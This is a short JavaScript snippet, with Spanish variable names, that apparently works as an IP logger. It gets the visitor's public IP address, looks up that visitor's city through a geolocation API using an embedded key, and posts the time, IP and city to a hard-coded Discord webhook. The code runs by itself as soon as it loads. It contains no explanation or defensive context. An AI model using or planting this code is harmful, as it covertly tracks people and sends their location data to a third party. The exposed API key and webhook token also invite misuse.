
async function fetchIPInformationAndSendToWebhook(webhookURL) {
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ip = data.ip;
  
    const url = `https://api.ipregistry.co/${ip}?hostname=true&key=o3ilo7k3f9j9bztb`;
    const ipResponse = await fetch(url);
    const ipData = await ipResponse.json();
  
    const hora = new Date().toLocaleTimeString();
    const ciudad = ipData.location.city;
  
    const payload = {
      content: `Hora: ${hora}\nIP: ${ip}\nCiudad: ${ciudad}`
    };
  
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
  }
  
  fetchIPInformationAndSendToWebhook('https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_')
  
